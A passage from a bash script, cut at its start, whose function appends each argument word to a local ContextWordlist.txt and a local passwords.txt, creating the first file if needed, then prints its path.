    # Define the context file path relative to current directory
    CONTEXT_FILE="./ContextWordlist.txt"

    # Ensure the context file exists
    if [ ! -f "$CONTEXT_FILE" ]; then
        touch "$CONTEXT_FILE"
    fi

    # Loop through all the arguments (context words)
    for word in "$@"; do
        # Append each word to the ContextWordlist.txt file in PWD
        echo "$word" >> "$CONTEXT_FILE"
        # Also append each word to the local passwords.txt (in PWD)
        echo "$word" >> ./passwords.txt
    done

    echo "Updated: $(realpath "$CONTEXT_FILE")"
}

